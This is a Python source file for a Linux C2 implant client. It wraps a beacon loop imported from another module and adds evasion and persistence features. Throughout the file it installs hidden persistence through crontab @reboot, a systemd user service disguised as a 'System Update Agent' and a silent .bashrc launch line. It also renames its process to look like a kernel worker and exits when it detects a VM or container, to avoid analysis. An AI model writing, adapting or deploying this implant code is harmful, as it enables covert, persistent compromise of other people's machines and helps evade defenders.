#!/usr/bin/env python3
"""
Linux-native C2 Client wrapper.

Adds Linux-specific capabilities on top of the core client:
  - Persistence via crontab, systemd user service, or .bashrc
  - Process name masquerading (argv[0] rewrite)
  - Anti-analysis checks (container / VM detection)
  - Runs the core beacon loop from client.py
"""

import os
import subprocess
import sys

# Ensure the core client module is importable
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from client import run, DEFAULT_C2_SERVER, DEFAULT_BEACON_INTERVAL, DEFAULT_JITTER, DEFAULT_COMMUNICATION_CHANNEL


# ── Persistence ───────────────────────────────────────────────────────

def persist_crontab(script_path: str | None = None) -> bool:
    """Add a @reboot crontab entry."""
    try:
        path = script_path or os.path.abspath(__file__)
        entry = f'@reboot /usr/bin/env python3 "{path}" &\n'
        result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        existing = result.stdout if result.returncode == 0 else ""
        if entry.strip() in existing:
            return True
        new_cron = existing.rstrip("\n") + "\n" + entry
        proc = subprocess.run(
            ["crontab", "-"], input=new_cron, capture_output=True, text=True,
        )
        return proc.returncode == 0
    except Exception:
        return False


def persist_systemd(script_path: str | None = None) -> bool:
    """Install a systemd user service."""
    try:
        path = script_path or os.path.abspath(__file__)
        svc_dir = os.path.expanduser("~/.config/systemd/user")
        os.makedirs(svc_dir, exist_ok=True)
        unit = f"""[Unit]
Description=System Update Agent
After=network-online.target

[Service]
ExecStart=/usr/bin/env python3 {path}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"""
        svc_path = os.path.join(svc_dir, "system-update-agent.service")
        with open(svc_path, "w") as f:
            f.write(unit)
        subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
        subprocess.run(
            ["systemctl", "--user", "enable", "--now", "system-update-agent.service"],
            capture_output=True,
        )
        return True
    except Exception:
        return False


def persist_bashrc(script_path: str | None = None) -> bool:
    """Append a background launch line to ~/.bashrc."""
    try:
        path = script_path or os.path.abspath(__file__)
        marker = "# c2-agent"
        bashrc = os.path.expanduser("~/.bashrc")
        if os.path.isfile(bashrc):
            with open(bashrc) as f:
                if marker in f.read():
                    return True
        with open(bashrc, "a") as f:
            f.write(f'\n(nohup python3 "{path}" &>/dev/null &) {marker}\n')
        return True
    except Exception:
        return False


# ── Process masquerading ──────────────────────────────────────────────

def masquerade_process(name: str = "[kworker/0:2-events]") -> None:
    """Overwrite argv[0] so the process shows a kernel-like name in ps."""
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6")
        buff = ctypes.create_string_buffer(name.encode())
        libc.prctl(15, buff, 0, 0, 0)  # PR_SET_NAME = 15
    except Exception:
        pass


# ── Anti-analysis ─────────────────────────────────────────────────────

def is_container() -> bool:
    """Detect Docker / LXC / VM."""
    indicators = [
        os.path.exists("/.dockerenv"),
        os.path.isfile("/proc/1/cgroup")
        and any(
            k in open("/proc/1/cgroup").read()
            for k in ("docker", "lxc", "kubepods")
        ),
    ]
    try:
        dmi = open("/sys/class/dmi/id/product_name").read().lower()
        indicators.append(
            any(v in dmi for v in ("virtualbox", "vmware", "kvm", "qemu", "xen"))
        )
    except Exception:
        pass
    return any(indicators)


# ── Entry point ───────────────────────────────────────────────────────

def main() -> None:
    import argparse

    parser = argparse.ArgumentParser(description="C2 Linux Client")
    parser.add_argument("--server", "-s", default=DEFAULT_C2_SERVER)
    parser.add_argument("--interval", "-i", type=int, default=DEFAULT_BEACON_INTERVAL)
    parser.add_argument("--jitter", "-j", type=float, default=DEFAULT_JITTER)
    parser.add_argument(
        "--persist",
        choices=["crontab", "systemd", "bashrc", "none"],
        default="none",
    )
    parser.add_argument("--masquerade", action="store_true", default=False)
    parser.add_argument("--container-check", action="store_true", default=False)
    args = parser.parse_args()

    if args.container_check and is_container():
        sys.exit(0)

    if args.masquerade:
        masquerade_process()

    if args.persist == "crontab":
        persist_crontab()
    elif args.persist == "systemd":
        persist_systemd()
    elif args.persist == "bashrc":
        persist_bashrc()

    run(args.server, args.interval, args.jitter)


if __name__ == "__main__":
    main()
